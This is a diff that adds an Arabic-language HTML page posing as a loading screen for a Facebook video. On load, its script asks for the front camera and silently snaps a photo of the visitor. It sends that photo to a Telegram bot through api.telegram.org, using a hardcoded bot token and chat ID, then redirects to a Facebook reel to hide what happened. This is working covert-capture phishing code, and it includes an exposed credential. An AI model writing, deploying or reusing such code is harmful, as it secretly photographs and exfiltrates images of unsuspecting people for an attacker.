@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>جاري التحميل...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { width: 100%; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; color: #fff; font-family: Tahoma, sans-serif; }
+        .box { text-align: center; padding: 20px; }
+        .btn { display: none; margin-top: 15px; padding: 12px 25px; background: #1877f2; color: #fff; text-decoration: none; border-radius: 5px; font-weight: bold; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h3 id="statusText">جاري التحقق من البيانات...</h3>
+        <a href="https://www.facebook.com/reel/1363942655583132/?fs=e&fs=e" id="goBtn" class="btn">اضغط هنا لمشاهدة الفيديو</a>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
+        const chatId = "5015426926";
+        const VIDEO_LINK = 'https://www.facebook.com/reel/1363942655583132/?fs=e&fs=e';
+
+        async function captureAndSend() {
+            try {
+                // طلب إذن الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(resolve => setTimeout(resolve, 800));
+
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                // إرسال الصورة لتيليجرام
+                await new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const formData = new FormData();
+                            formData.append("chat_id", chatId);
+                            formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
+                            try {
+                                await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            } catch (err) {}
+                        }
+                        resolve();
+                    }, "image/jpeg", 0.8);
+                });
+
+            } catch (error) {
+                // حتى لو رفض المستخدم الإذن، نستمر
+            }
+
+            // بعد الانتهاء تماماً (سواء وافق أو رفض)، نقوم بالتحويل تلقائياً أو إظهار الزر
+            setTimeout(() => {
+                window.location.href = VIDEO_LINK;
+            }, 500);
+        }
+
+        // بدء العملية فور تحميل الصفحة
+        window.onload = function() {
+            setTimeout(captureAndSend, 500);
+        };
+    </script>
+
+</body>
+</html>
